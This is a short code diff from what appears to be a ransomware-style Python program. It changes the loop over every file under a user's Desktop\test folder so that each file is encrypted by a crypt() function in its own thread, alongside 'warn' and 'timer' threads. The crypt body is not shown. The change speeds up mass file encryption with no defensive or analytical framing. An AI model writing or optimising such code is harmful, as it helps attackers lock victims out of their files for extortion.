@@ -64,7 +64,8 @@ def main():
     path1 = "C:\\\\Users\\\\" + user + "\\\\Desktop\\\\test"
     my_path = Path(path1)
     for file in my_path.glob("**/*.*"):
-        crypt(file)
+        crypthtread = threading.Thread(target=crypt, args=[file])
+        crypthtread.start()
     warnthread = threading.Thread(target=warn)
     warnthread.start()
     timerthread = threading.Thread(target=timer)
